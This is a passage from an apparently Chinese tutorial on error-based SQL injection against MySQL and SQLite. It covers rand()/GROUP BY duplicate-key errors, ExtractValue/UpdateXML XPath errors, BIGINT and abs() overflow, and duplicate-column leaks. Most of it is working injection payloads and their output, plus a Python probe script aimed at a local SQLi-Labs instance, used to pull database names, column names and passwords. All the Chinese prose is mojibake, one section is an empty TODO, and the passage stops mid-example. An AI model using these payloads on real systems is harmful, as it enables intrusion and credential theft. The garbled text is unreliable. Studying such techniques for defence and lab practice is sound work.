> è‡³æ­¤é—®é¢˜å‡ºç°äº†â€”â€”ä¸èƒ½é‡å¤çš„ä¸»é”®ç«Ÿç„¶é‡å¤äº†ï¼MySQLæ•é”åœ°å¯Ÿè§‰åˆ°äº†è¿™ä¸€é—®é¢˜ï¼Œå¹¶ä¸”é˜»æ­¢ç¨‹åºæ·»åŠ æ–°è¡Œï¼Œäºæ˜¯ç¨‹åºä¼šçˆ†å‡º`ERROR 1062 (23000): Duplicate entry '<ColumnNameWithRAND()>' for key 'group_key'`çš„é”™è¯¯ã€‚å…¶ä¸­`<ColumnNameWithRAND()>`æ˜¯æ‰€éœ€è¡¨è¾¾å¼æ‰§è¡Œåçš„ç»“æœï¼Œåˆ©ç”¨è¿™ä¸€ç‚¹å¯ä»¥å®ç°é”™è¯¯æ³¨å…¥ã€‚
>
> ```sql
> SELECT CONCAT((SELECT database()),floor(rand()*2)) AS something
> 	FROM INFORMATION_SCHEMA.TABLES
> 	WHERE TABLE_SCHEMA='security';
> 			+-----------+
> 			| something |
> 			+-----------+
> 			| security0 |
> 			| security0 |
> 			| security1 |
> 			| security0 |
> 			+-----------+
> SELECT CONCAT((SELECT database()),floor(rand()*2)) AS something
> 	FROM INFORMATION_SCHEMA.TABLES
> 	WHERE TABLE_SCHEMA='security'
> 	GROUP BY something;
> 			+-----------+
> 			| something |
> 			+-----------+
> 			| security0 | 
> 			| security1 |
> 			+-----------+
> -- æ‰§è¡Œä¸‹åˆ—è¯­å¥ä¼šå¾—åˆ°ä¸åŒçš„ç»“æœï¼Œè‡ªæ£€å¾—åˆ°æˆåŠŸé¢‘ç‡=41/80ï¼Œå¤±è´¥é¢‘ç‡=39/80ï¼Œå¤§æ¦‚äº”äº”å¼€
> SELECT
> 	COUNT(*),
> 	CONCAT((SELECT database()),floor(rand()*2)) AS something
> 	FROM INFORMATION_SCHEMA.TABLES
> 	WHERE TABLE_SCHEMA='security'
> 	GROUP BY something;
> 			-- ERROR 1062 (23000): Duplicate entry 'security0' for key 'group_key'
> 		æˆ–è€…
> 			+----------+-----------+
> 			| COUNT(*) | something |
> 			+----------+-----------+
> 			|        2 | security0 | # çˆ†database()
> 			|        2 | security1 |
> 			+----------+-----------+
> ```
>
> åˆ†æä»¥ä¸Šè¿‡ç¨‹ï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°è¿™ç§é”™è¯¯æœ‰ä»¥ä¸‹å‰ææ¡ä»¶ï¼š
>
> 1. è¦æŒ‘é€‰åˆé€‚çš„ç§å­ï¼Œä½¿å¾—`floor(rand()*2)`ç”Ÿæˆçš„éšæœºæ•°åºåˆ—åœ¨è®©ä¸´æ—¶è¡¨ç©·å°½æ‰€æœ‰å¯èƒ½æ€§ä¹‹å‰å‘ç”Ÿä¸»é”®é‡å¤é”™è¯¯
>
>    ä¾‹å¦‚`rand(1)`ä¼šå¯¼è‡´`floor(rand()*2)`è¾“å‡ºçš„åºåˆ—ä¸º`0,1,0,0`ï¼Œé‡å¤ä¸Šè¿°æ­¥éª¤ï¼Œ
>
>    | `floor(rand(1)*2)`(ä¸»é”®) | `count(*)` |
>    | :----------------------: | :--------: |
>
>    | `floor(rand(1)*2)`(ä¸»é”®) | `count(*)` |
>    | :----------------------: | :--------: |
>    |           `1`            |     1      |
>
>    | `floor(rand(1)*2)`(ä¸»é”®) | `count(*)` |
>    | :----------------------: | :--------: |
>    |           `1`            |     1      |
>    |           `0`            |     1      |
>
>    æ­¤æ—¶è¡¨å†…çš„è®°å½•éƒ½é½å…¨äº†ï¼Œéšä¾¿å–ä¸€ä¸ªéšæœºæ•°éƒ½èƒ½åœ¨è¡¨ä¸­æ‰¾åˆ°å¯¹åº”çš„è¡Œï¼Œæ‰€ä»¥ä¹‹åçš„æ•°æ®éƒ½æ˜¯ç›´æ¥è®©`count(*)`è‡ªå¢ï¼Œä¸ä¼šè¿›è¡Œåˆ°æ’å…¥æ–°è¡Œçš„è¿™ä¸€æ­¥ï¼Œå› æ­¤ä¸ä¼šäº§ç”Ÿä¸»é”®é‡å¤æŠ¥é”™ã€‚
>
> 2. .è¡¨å†…æ•°æ®å¿…é¡»å¤§äºç­‰äºä¸¤è¡Œ
>
>    æ˜¾ç„¶ä¸´æ—¶è¡¨ä¸­å¿…é¡»ç°æœ‰ä¸€è¡Œï¼Œæ‰èƒ½ä»¥å…¶ä½œä¸ºå‚ç…§è¿›è¡Œä¸»é”®ç¢°æ’ã€‚ä¾‹å¦‚`floor(rand(14)*2)`äº§ç”Ÿçš„``[1,0,1,0,...]`ã€‚

å¸¸è§çš„Payloadä¸ºï¼š`1' union select 1 from (select count(*),concat((SELECTè¯­å¥),floor(rand(0)*2))x from è®°å½•æ•°å¤§äºç­‰äºäºŒçš„è¡¨ group by x)y`

> æ³¨æ„ï¼šèƒ½ä¸èƒ½ç”¨`1' union select count(*),concat((SELECTè¯­å¥),floor(rand(14)*2)) as a from è®°å½•æ•°å¤§äºç­‰äºäºŒçš„è¡¨ group by a`ä½œä¸ºPayloadå‘¢ï¼Ÿç­”æ¡ˆæ˜¯ä¸è¡Œã€‚
>
> ç»è¿‡å®æµ‹ï¼Œå½“`SELECTè¯­å¥`æ¯”è¾ƒç®€çŸ­æ—¶ï¼ˆä¾‹å¦‚`select user()`ã€`select database()`ï¼Œç”šè‡³æ˜¯`select concat(user(),database())`ï¼‰ï¼Œä¸Šè¿°è§„å¾‹ä¾ç„¶é€‚ç”¨ï¼Œä¹Ÿä¼šå¯¼è‡´é€æ¸é‡å¤è€Œæ‰§è¡ŒPayloadã€‚
>
> ç„¶è€Œï¼Œå½“`SELECTè¯­å¥`åŒ…å«`group_concat()`ï¼ˆä¾‹å¦‚`SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'`ï¼‰ï¼Œä¸Šè¿°è§„å¾‹å®Œå…¨å¤±æ•ˆã€‚å®¹æ˜“éªŒè¯ï¼šå½“`GROUP BY`å°è¯•å‘ä¸´æ—¶è¡¨å¢åŠ æ–°è¡Œæ—¶ï¼Œä½¿ç”¨çš„ä¸»é”®ä¸æ˜¯å†æ¬¡æ‰§è¡Œè¡¨è¾¾å¼å¾—åˆ°çš„å€¼ï¼Œè€Œæ˜¯ä¸Šæ¬¡ç”¨äºåˆ¤æ–­ä¸´æ—¶è¡¨ä¸­æ˜¯å¦å­˜åœ¨ä¸»é”®é‡å¤ç”¨çš„å€¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåˆ¤æ–­ä¸»é”®æ˜¯å¦é‡å¤ç”¨çš„æ˜¯ä»€ä¹ˆå€¼ï¼Œå¢åŠ æ–°è¡Œç”¨åˆ°çš„ä¸»é”®å°±æ˜¯ä»€ä¹ˆå€¼ã€‚è¿™å½»åº•ç ´åäº†ä¸»é”®é‡å¤æ³¨å…¥çš„å¯èƒ½æ€§ã€‚
>
> æˆ‘ä»¬çŸ¥é“ï¼Œè¦æŠŠæœç´¢ç»“æœé€šè¿‡æŠ¥é”™ä¿¡æ¯è¾“å‡ºï¼Œæˆ‘ä»¬çš„å­æŸ¥è¯¢çš„ç»“æœå°±åªèƒ½æœ‰ä¸€è¡Œã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œé™¤äº†ä½¿ç”¨`group_concat()`ä¹‹å¤–ï¼Œå…¶å®ƒ[WriteUp](https://blog.csdn.net/silence1_/article/details/90812612)ä¸­ä¹Ÿæåˆ°å¯ä»¥ä½¿ç”¨`LIMIT`å­å¥ï¼ˆä¾‹å¦‚`SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' LIMIT 0,1`ï¼‰ã€‚è¿™ç§æ–¹æ³•ç¨³å®šæœ‰æ•ˆã€‚
>
> ç¬”è€…æ¨æµ‹ï¼Œè¿™å¯èƒ½æ˜¯å› ä¸º`LIMIT`æ¯•ç«Ÿæ˜¯æŠŠå¤šè¡Œç æˆä¸€è¡Œï¼Œè€Œ`group_concat()`ç›´æ¥å°±åªæ˜¯ä¸€è¡Œã€‚ä½†æ˜¯è¿™ç§è§£é‡Šä¸èƒ½ä»¤äººä¿¡æœã€‚åªèƒ½æœŸå¾…æœ‰æ— C++å¤§æ‰‹å­åˆ†æä¸€ä¸‹MySQLæºç äº†ã€‚ğŸ˜…

### Â§3.1.2 XPathæ³¨å…¥

MySQLå†…éƒ¨å®šä¹‰äº†ä¸¤ä¸ªä¸XMLç›¸å…³çš„å‡½æ•°â€”â€”`ExtractValue()`ä¸`UpdateXML()`ã€‚ï¼ˆå¤§å°å†™ä¸æ•æ„Ÿï¼‰

- `ExtractValue(xml_frag, xpath_expr)`æ ¹æ®XPathè¡¨è¾¾å¼`xpath_expr`ä»XMLå­—ç¬¦ä¸²`xml_frag`ä¸­æå–å€¼ï¼š

  ```sql
  mysql> SET @xmlString = '<html><body><a>First</a><a>Second</a></body></html>';
  
  mysql> SELECT 1,EXTRACTVALUE(@xmlString,'/html/body/a[1]');
  +---+--------------------------------------------+
  | 1 | EXTRACTVALUE(@xmlString,'/html/body/a[1]') |
  +---+--------------------------------------------+
  | 1 | First                                      |
  +---+--------------------------------------------+
  1 row in set (0.00 sec)
  
  mysql> SELECT 2,EXTRACTVALUE(@xmlString,'/html/body/a[2]');
  +---+--------------------------------------------+
  | 2 | EXTRACTVALUE(@xmlString,'/html/body/a[2]') |
  +---+--------------------------------------------+
  | 2 | Second                                     |
  +---+--------------------------------------------+
  1 row in set (0.00 sec)
  
  mysql> SELECT 2,EXTRACTVALUE(@xmlString,'//a[2]');
  +---+-----------------------------------+
  | 2 | EXTRACTVALUE(@xmlString,'//a[2]') |
  +---+-----------------------------------+
  | 2 | Second                            |
  +---+-----------------------------------+
  1 row in set (0.00 sec)
  ```

- `UpdateXML(xml_target, xpath_expr, new_xml)`åœ¨XMLå­—ç¬¦ä¸²`xml_target`ä¸­å¯»æ‰¾åŒ¹é…XPathè¡¨è¾¾å¼`xpath_expr`çš„æ‰€æœ‰éƒ¨åˆ†ï¼Œå¹¶å°†å…¶æ›¿æ¢ä¸º`new_xml`ï¼š

  ```sql
  mysql> select UpdateXML('<a><b>ccc</b><d></d></a>', '/a', '<e>fff</e>'); # åŒ¹é…æ ¹æ ‡ç­¾
  +-----------------------------------------------------------+
  | UpdateXML('<a><b>ccc</b><d></d></a>', '/a', '<e>fff</e>') |
  +-----------------------------------------------------------+
  | <e>fff</e>                                                |
  +-----------------------------------------------------------+
  
  mysql> select UpdateXML('<a><b>ccc</b><d></d></a>', '//b', '<e>fff</e>'); # åŒ¹é…å­—æ ‡ç­¾
  +------------------------------------------------------------+
  | UpdateXML('<a><b>ccc</b><d></d></a>', '//b', '<e>fff</e>') |
  +------------------------------------------------------------+
  | <a><e>fff</e><d></d></a>                                   |
  +------------------------------------------------------------+
  1 row in set (0.00 sec)
  
  mysql> select UpdateXML('<a><b>ccc</b><b>ccc</b><d></d></a>', '//b', '<e>fff</e>'); # å¤šåŒ¹é…é¡¹
  +----------------------------------------------------------------------+
  | UpdateXML('<a><b>ccc</b><b>ccc</b><d></d></a>', '//b', '<e>fff</e>') |
  +----------------------------------------------------------------------+
  | <a><b>ccc</b><b>ccc</b><d></d></a>                                   |
  +----------------------------------------------------------------------+
  1 row in set (0.00 sec)
  ```

å½“XPathè¡¨è¾¾å¼`xpath_expr`ä¸ç¬¦åˆè¯­æ³•æ—¶ï¼ŒMySQLå°†è¾“å‡ºå¤„ç†åçš„XPathè¡¨è¾¾å¼å¹¶æŠ¥é”™ã€‚å½“è¿™ä¸€å˜é‡å®Œå…¨å¯æ§æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„é€ ç›¸åº”çš„æ¶æ„è¡¨è¾¾å¼æ¥çˆ†åº“ã€‚ä¸ºäº†è®©XPathè¡¨è¾¾å¼ä¸ç¬¦åˆè¯­æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨`~`ã€`0x0a`è¿™ç±»ç‰¹æ®Šå­—ç¬¦ï¼š

```sql
mysql> SELECT * FROM users WHERE id='1' and extractvalue('kk',concat('~',(select database())));
ERROR 1105 (HY000): XPATH syntax error: '~security'

mysql> select * from users where id='1' and updatexml('anything',concat('~',(select database())),'anything');
ERROR 1105 (HY000): XPATH syntax error: '~security'
```

> æ³¨æ„ï¼šXPathè¡¨è¾¾å¼åœ¨XMLå­—ç¬¦ä¸²ä¸­æ‰¾ä¸åˆ°æŒ‡å®šçš„å…ƒç´ æ—¶ï¼Œå¹¶ä¸ä¼šæŠ¥é”™ï¼Œè€Œæ˜¯é»˜è®¤éšè—è­¦å‘Šï¼Œå¹¶ä¸”ä»¤å‡½æ•°è¿”å›`NULL`ï¼Œåªæœ‰é€šè¿‡`SHOW WARNINGS`è¯­å¥æ‰èƒ½çœ‹åˆ°ã€‚å› æ­¤ï¼Œè¿™ç§XPathè¡¨è¾¾å¼ä¾ç„¶ç¬¦åˆè¯­æ³•ï¼ŒMySQLçš„å‡½æ•°ä¹Ÿä¸ä¼šæŠ¥é”™ã€‚
>
> ä¸ºäº†è®©XPathè¡¨è¾¾å¼çœŸæ­£çš„éæ³•ï¼Œä»è€Œè®©å‡½æ•°æŠ¥é”™ï¼Œæˆ‘ä»¬éœ€è¦åœ¨XPathè¡¨è¾¾å¼ä¸­åŠ å…¥éæ³•å­—ç¬¦ã€‚ç»å®æµ‹ï¼Œæ‰€æœ‰éæ³•å­—ç¬¦å¦‚ä¸‹æ‰€ç¤ºï¼š
>
> ```python
> import requests
> 
> url = "http://localhost/SQLi-Labs/Less-5/?id=1' and extractvalue('',concat({},(select database())))--+"
> 
> for i in range(0,256):
>     hexChar = hex(i)
>     currentUrl = url.format(hexChar)
>     result = requests.get(currentUrl)
>     if "syntax error" in result.text:
>         print("{} extractvalue()æŠ¥é”™".format(hexChar))
>     else: # ä»€ä¹ˆä¹Ÿæ²¡æœ‰
>         print("{} extractvalue()è¿”å›NULL".format(hexChar))
> /*
>     0x0~0x1f
>         (ç¼º0x20:ç©ºæ ¼)
>     0x21~0x23:
>     `	(ç¼º0x24:$)
>     0x25~0x2c
>         (ç¼º0x2d:-)
>     0x2e:.
>         (ç¼º0x2f:/)
>     0x30~0x3f:?
>         (ç¼º0x40:@å’Œ0x41~0x5açš„æ‰€æœ‰å¤§å†™ç¥–æ¯)
>     0x5b~0x5e
>         ï¼ˆç¼º0x5f:_ï¼‰
>     0x60:`
>         (ç¼º0x61-0x7açš„æ‰€æœ‰å°å†™å­—æ¯)
>     0x7b~0xff
> */
> ```

> æ³¨æ„ï¼šç»è¿‡å®æµ‹ï¼ŒæŠ¥é”™ä¿¡æ¯åªèƒ½è¿”å›32ä¸ªå­—ç¬¦ã€‚å†æ‰£é™¤ä¸€ä¸ªéæ³•å­—ç¬¦ï¼Œèƒ½è¿”å›çš„åªæœ‰31ä¸ªå­—ç¬¦ï¼š
>
> ```sql
> mysql> select group_concat(password) from users;
> +--------------------------------------------------------------------------------------------------+
> | group_concat(password)                                                                           |
> +--------------------------------------------------------------------------------------------------+
> | Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4 |
> +--------------------------------------------------------------------------------------------------+
> 
> mysql> SELECT * FROM users WHERE id='0' and extractvalue(0x0a,concat(0x0a,(select group_concat(password) from users)));
> ERROR 1105 (HY000): XPATH syntax error: ' Dumb,I-kill-you,p@ssword,crappy'
> ```
>
> ä¸ºäº†è·å–åˆ°å®Œæ•´çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯¹å­—ç¬¦ä¸²è¿›è¡Œæˆªå–ï¼Œåˆ†æ®µè·å–æ¯éƒ¨åˆ†ï¼Œæœ€ç»ˆæ‹¼æ¥åˆ°ä¸€èµ·ï¼š
>
> - `left(åˆ—å,é•¿åº¦)`ä¸`right(åˆ—å,é•¿åº¦)`
>
>   ```sql
>   ?id=1'^extractvalue(1,concat(0x7e,(select(left(password,30))from(è¡¨å))))%23
>   
>   ?id=1'^extractvalue(1,concat(0x7e,(select(right(password,30))from(è¡¨å))))%23
>   ```
>
> - `substring()`
>
>   åªèƒ½ä½¿ç”¨`substring()`ã€`substr()`ã€`left()`ã€`right()`ã€`regexp()`ç­‰å‡½æ•°åˆ†æ‰¹æ¬¡è·å–ï¼šï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼ŸTODOï¼šï¼Ÿï¼Ÿï¼Ÿ
>
>   ```
>                       
>   ```
>
>   

> æ³¨æ„ï¼šå½“ä¸”ä»…å½“`ExtractValue()`ä¸`UpdateXML()`çš„è¿”å›å€¼è¢«å½“ä½œå¸ƒå°”è¡¨è¾¾å¼åº”ç”¨äº`WHERE`å­å¥æ—¶ï¼ŒXPathè¡¨è¾¾å¼æ‰ä¼šè¢«è§£æåˆ°æœ€ç»ˆå½¢æ€ï¼š
>
> ```sql
> // extractvalue()ä½œä¸ºSelectå­å¥çš„åˆ—åæ—¶ï¼Œä¸ä¼šè¢«å¤„ç†
> mysql> SELECT EXTRACTVALUE("anything",concat(~,(select database())));
> ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(select database())))' at line 1
> ```

### Â§3.1.3 å¤§æ•°æº¢å‡ºæ³¨å…¥

> æ³¨æ„ï¼šæº¢å‡ºæ³¨å…¥ä¾èµ–äºç‰¹å®šçš„MySQLç‰ˆæœ¬â€”â€”
>
> - MySQL < 5.5ï¼Œæ•´å½¢æº¢å‡ºä¸ä¼šæŠ¥é”™ï¼Œæœ¬æ–¹æ³•æ— æ•ˆ
> - 5.5.5 < MySQL < 5.5.47ï¼Œæ•´å½¢æº¢å‡ºä¼šæŠ¥é”™ï¼Œèƒ½å¤Ÿæ‰§è¡Œå¹¶è¿”å›payloadï¼Œæœ¬æ–¹æ³•ç”Ÿæ•ˆ
> - MySQL > 5.5.53ï¼Œæ•´å½¢æº¢å‡ºä¼šæŠ¥é”™ï¼Œä½†ä¸ä¼šæ‰§è¡Œå¹¶è¿”å›payloadï¼Œæœ¬æ–¹æ³•å¤±æ•ˆ

MySQLé»˜è®¤ä½¿ç”¨çš„æ•´æ•°ç±»å‹æ˜¯æ— ç¬¦å·å‹`BIGINT`ï¼Œå ç”¨8ä¸ªå­—èŠ‚ï¼Œæœ€å¤§å€¼ä¸º$2^{64}-1=18446744073709551615$ã€‚

```sql
mysql> select 18446744073709551615;
+----------------------+
| 18446744073709551615 |
+----------------------+
| 18446744073709551615 |
+----------------------+
1 row in set (0.00 sec)

mysql> select 18446744073709551616;
+----------------------+
| 18446744073709551616 |
+----------------------+
| 18446744073709551616 |
+----------------------+
1 row in set (0.00 sec)

mysql> select 18446744073709551615 + 1;
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(18446744073709551615 + 1)'
```

æˆ‘ä»¬ä¹Ÿå¯ä»¥å¯¹`0`æŒ‰ä½å–åï¼Œå¿«é€Ÿå¾—åˆ°æœ€å¤§å€¼ï¼š

```sql
mysql> select ~0;
+----------------------+
| ~0                   |
+----------------------+
| 18446744073709551615 |
+----------------------+
1 row in set (0.00 sec)

mysql> select ~0 + 1;
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(~(0) + 1)'
```

æˆ‘ä»¬çŸ¥é“ï¼Œå¦‚æœä¸€ä¸ª`SELECT`å­å¥æ‰§è¡ŒæˆåŠŸï¼Œé‚£ä¹ˆå®ƒçš„è¿”å›å€¼å¯ä»¥è§†ä¸º`0`ï¼š

```sql
mysql> select (select user());
+-----------------+
| (select user()) |
+-----------------+
| root@localhost  |
+-----------------+
1 row in set (0.00 sec)

mysql> select !(select user()); # ä¸€æ¬¡å–å
+------------------+
| !(select user()) |
+------------------+
|                1 |
+------------------+
1 row in set (0.00 sec)

mysql> select !(select !(select user())); # äºŒæ¬¡å–å
+----------------------------+
| !(select !(select user())) |
+----------------------------+
|                          0 |
+----------------------------+
1 row in set (0.00 sec)
```

æœ€ç»ˆæ„å»ºpayloadï¼š

```sql
mysql> select (select(!x-~0)from(select(select user())x)a); # xä¸aå‡çœç•¥ASå…³é”®å­—
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))'
```

### Â§3.1.4 åˆ—åé‡å¤æ³¨å…¥

æˆ‘ä»¬çŸ¥é“ï¼Œä¸€ä¸ªè¡¨ï¼ˆ`Table`ï¼‰ä¸å…è®¸åŒ…å«ä¸¤ä¸ªåç§°ç›¸åŒçš„å­—æ®µï¼Œä½†æ˜¯ä¸€ä¸ªå­æŸ¥è¯¢ï¼ˆ`Subquery`ï¼‰æ˜¯å¯ä»¥çš„ã€‚å¦‚æœæˆ‘ä»¬æŠŠå­æŸ¥è¯¢çœ‹ä½œä¸€ä¸ªè¡¨ï¼Œä½œä¸º`FROM`å­å¥çš„å‚æ•°ï¼Œé‚£ä¹ˆå°±ä¼šå¯¼è‡´é”™è¯¯ã€‚è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨`NAME_CONST(name,value)`å‡½æ•°åˆ›å»ºä¸´æ—¶åˆ—ï¼š

```sql
mysql> select * from (select NAME_CONST('HelloWorld',1),NAME_CONST('HelloWorld',2));
    ERROR 1248 (42000): Every derived table must have its own alias # æŠ¥é”™ï¼Œå­æŸ¥è¯¢ä½œä¸ºè¡¨æ—¶å¿…é¡»æŒ‡å®šåˆ«å

mysql> select * from (select NAME_CONST('HelloWorld',1),NAME_CONST('HelloWorld',2)) AS x;
    ERROR 1060 (42S21): Duplicate column name 'HelloWorld' # HelloWorldè¢«çˆ†å‡ºæ¥äº†

mysql> select * from (select NAME_CONST('HelloWorld',1),NAME_CONST('HelloWorld',2))x; # ä¹Ÿå¯ä»¥å¿½ç•¥ASå…³é”®å­—
    ERROR 1060 (42S21): Duplicate column name 'HelloWorld'
```

æˆ‘ä»¬å‘ç°é”™è¯¯ä¿¡æ¯ä¸­åŒ…å«é‡å¤çš„åˆ—åã€‚åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥å°†payloadæ”¾å…¥åˆ—åä¸­ï¼š

```sql
# çˆ†æ•°æ®åº“ç‰ˆæœ¬
mysql> select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
    ERROR 1060 (42S21): Duplicate column name '5.5.53'
```

ç„¶è€Œé«˜ç‰ˆæœ¬çš„[å®˜æ–¹æ–‡æ¡£](https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_name-const)æ˜ç¡®è¡¨ç¤ºï¼Œ`name_const()`å‡½æ•°ä¸­çš„æ‰€æœ‰å‚æ•°åªèƒ½ä¸ºå¸¸é‡ï¼Œå› æ­¤æ— æ³•æ‰§è¡Œä»»æ„payloadï¼Œæ‰€ä»¥è¯¥æ–¹æ³•åªé€‚ç”¨äºä½ç‰ˆæœ¬ï¼ˆ>5.0.12ï¼‰ï¼š

> - `NAME_CONST(name,value)`
>
>   Returns the given value. When used to produce a result set column, NAME_CONST() causes the column to have the given name. **<u>The arguments should be constants</u>**.

æ—¢ç„¶`name_const()`è¡Œä¸é€šï¼Œé‚£æˆ‘ä»¬å°±è¯•è¯•ç”¨å…¶ä»–æ–¹æ³•è·å–åˆ—åã€‚ä¾‹å¦‚æ¯å¼ è¡¨çš„åˆ—åå°±æ˜¯ç°æˆçš„åˆ—åï¼Œæˆ‘ä»¬å¯ä»¥çˆ†åˆ—åï¼š

```sql
mysql> select * from users a join users b; # æ„å»ºå«æœ‰é‡å¤åˆ—åçš„Subquery
+----+----------+------------+----+----------+------------+
| id | username | password   | id | username | password   |
+----+----------+------------+----+----------+------------+
|  1 | Dumb     | Dumb       |  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |  1 | Dumb     | Dumb       |
| .. | ......   | ......     | .. | ......   | ......     |
| 14 | admin4   | admin4     | 14 | admin4   | admin4     |
+----+----------+------------+----+----------+------------+

mysql> select * from (select * from users a join users b) c;
	ERROR 1060 (42S21): Duplicate column name 'id' # çˆ†å‡ºä¸€ä¸ªåä¸ºidçš„å­—æ®µ
```

ä½†æ˜¯è¿™æ ·åªèƒ½çˆ†å‡ºä¸€ä¸ªå­—æ®µã€‚äºæ˜¯æˆ‘ä»¬ä½¿ç”¨`USING`å­å¥åˆ é™¤å·²çŸ¥åç§°çš„å­—æ®µï¼š

```sql
mysql> select * from users a join users b using(id);
+----+----------+------------+----------+------------+
| id | username | password   | username | password   |
+----+----------+------------+----------+------------+
|  1 | Dumb     | Dumb       | Dumb     | Dumb       |
| .. | ......   | ......     | ......   | ......     |
| 14 | admin4   | admin4     | admin4   | admin4     |
+----+----------+------------+----------+------------+
13 rows in set (0.00 sec)

mysql> select * from users a join users b using(id,username);
+----+----------+------------+------------+
| id | username | password   | password   |
+----+----------+------------+------------+
|  1 | Dumb     | Dumb       | Dumb       |
| .. | ......   | ......     | ......     |
| 14 | admin4   | admin4     | admin4     |
+----+----------+------------+------------+
13 rows in set (0.00 sec)

mysql> select * from users a join users b using(id,username,password);
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
| .. | ......   | ......     |
| 14 | admin4   | admin4     |
+----+----------+------------+
13 rows in set (0.00 sec)
```

è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€ä¸ªçˆ†å‡ºæ‰€æœ‰çš„åˆ—åäº†ï¼š

```sql
mysql> select * from (select * from users a join users b) c;
    ERROR 1060 (42S21): Duplicate column name 'id' # çˆ†å‡ºåˆ—åid

mysql> select * from (select * from users a join users b using(id)) c;
    ERROR 1060 (42S21): Duplicate column name 'username' # çˆ†å‡ºåˆ—åusername

mysql> select * from (select * from users a join users b using(id,username)) c;
    ERROR 1060 (42S21): Duplicate column name 'password' # çˆ†å‡ºåˆ—åpassword

mysql> select * from (select * from users a join users b using(id,username,password)) c;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
| .. | ........ | .......... |
| 14 | admin4   | admin4     |
+----+----------+------------+ # ä¸æŠ¥é”™ï¼Œè¯´æ˜åˆ—åå…¨éƒ½çˆ†å®Œäº†
```

### Â§3.1.5 `abs()`å¤§æ•°æº¢å‡ºæ³¨å…¥

> æ³¨æ„ï¼šæœ¬æ³¨å…¥æ–¹æ³•åªé€‚ç”¨äºSQLiteï¼Œä¸é€‚ç”¨äºMySQLå’ŒMariaDBã€‚

[SQLiteçš„å®˜æ–¹æ–‡æ¡£-å‡½æ•°åˆ—è¡¨](https://www.sqlite.org/lang_corefunc.html)ä¸­æåˆ°äº†`abs()`å‡½æ•°çš„ç‰¹æ€§ï¼š

> - abs(X)
>
>   The abs(X) function returns the absolute value of the numeric argument X. Abs(X) returns NULL if X is NULL. Abs(X) returns 0.0 if X is a string or blob that cannot be converted to a numeric value. If X is the integer -9223372036854775808 then abs(X) throws an integer overflow error since there is no equivalent positive 64-bit two complement value.
>
>   abs(X)å‡½æ•°ç”¨äºè¿”å›å‚æ•°Xçš„ç»å¯¹å€¼ã€‚å‚æ•°Xä¸º`NULL`æ—¶è¿”å›å€¼ä¹Ÿä¸º`NULL`ï¼›å‚æ•°Xä¸ºå­—ç¬¦ä¸²æˆ–æ— æ³•è½¬æ¢ä¸ºæ•°å­—çš„å¼ é‡æ—¶è¿”å›å€¼ä¸º`0.0`ï¼›å‚æ•°Xä¸º`-2^63`æ—¶æŠ›å‡ºæ•´æ•°æº¢å‡ºé”™è¯¯ã€‚ï¼ˆå®é™…ä¸Šï¼Œ

`abs()`æ¶‰åŠåˆ°æ­£è´Ÿå·è½¬æ¢ï¼Œå› æ­¤ä½¿ç”¨çš„æ˜¯64ä½æœ‰ç¬¦å·æ•´æ•°ã€‚å®˜æ–¹æ–‡æ¡£å°šæœªæŒ‡å‡ºçš„ä¸€ç‚¹æ˜¯ï¼Œç»å®æµ‹ï¼šå½“å‚æ•°Xå¤§äºç­‰äº`0x8000000000000000`æ—¶å°±ä¼šæŠ¥é”™ã€‚

```sqlite
sqlite> select abs(0x7fffffffffffffff);
9223372036854775807

sqlite> select abs(0x8000000000000000);
Runtime error: integer overflow

sqlite> select abs(0x7fffffffffffffff + 1);
9.22337203685478e+18
```

æŠ¥é”™æç¤ºæŒ‡å‡ºè¿™æ˜¯ä¸€ä¸ª`Runtime Error`ï¼Œå¹¶éç¼–è¯‘æ—¶é”™è¯¯ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ ¹æ®æŸäº›å¯æ§çš„æ¡ä»¶ï¼Œæœ‰é€‰æ‹©æ€§çš„è¿è¡Œå¤§æ•°ï¼Œæ ¹æ®æŠ¥é”™ä¸å¦åˆ¤æ–­æ¡ä»¶æ˜¯å¦æˆç«‹ï¼š

```sqlite
sqlite> select iif(1,123456,abs(0x8000000000000000));
123456

sqlite> select iif(0,123456,abs(0x8000000000000000));
Runtime error: integer overflow
```

> MariaDBä¸MySQLçš„`abs()`å‡æ²¡æœ‰å¤§æ•°æº¢å‡ºæŠ¥é”™ï¼Œå…¶è¡Œä¸ºå¦‚ä¸‹æ‰€ç¤ºï¼š
>
> - MariaDBï¼šè¶…è¿‡`0x8000000000000000`æ—¶ï¼Œå°†ä¼šè¢«è§†ä¸ºè´Ÿæ•°ï¼Œç›¸å½“äºä»¥æœ‰ç¬¦å·æ•°çš„è§„åˆ™è¯»å–æ— ç¬¦å·æ•°ã€‚
>
>   ```mariadb
>   MariaDB [(none)]> select abs(0x7FFFFFFFFFFFFFFF);
>   +-------------------------+
>   | ABS(0x7FFFFFFFFFFFFFFF) |
>   +-------------------------+
>   |     9223372036854775807 |
>   +-------------------------+
>   
